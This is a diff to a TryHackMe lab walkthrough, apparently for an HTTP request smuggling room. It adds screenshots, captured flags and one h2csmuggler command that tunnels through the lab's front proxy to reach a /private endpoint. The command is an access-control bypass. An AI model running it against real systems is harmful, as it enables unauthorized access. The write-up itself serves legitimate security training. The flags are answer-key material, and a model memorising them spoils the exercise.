@@ -28,3 +28,25 @@ https://10.10.201.196:8000/post/12315198742342
 THM{my_name_is_a_flag}
 ```
 
+https://10.10.140.238:8100/hello
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/e863829c-46cd-4159-a7b2-d56011b067f6)
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/76c016e6-171b-46e0-9f91-2707f30a0d91)
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/60d3a1bd-6d19-420f-b831-4dc223c0a847)
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/a30253f0-e2f6-4d4e-9eeb-b1e3a8040500)
+
+
+https://github.com/BishopFox/h2csmuggler
+
+```
+python3 h2csmuggler.py -x https://10.10.140.238:8200/ https://10.10.140.238:8200/private
+```
+
+```
+THM{walls_are_a_suggestion}
+```
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/17afdbba-a780-4a74-bed7-bab14fd1610c)
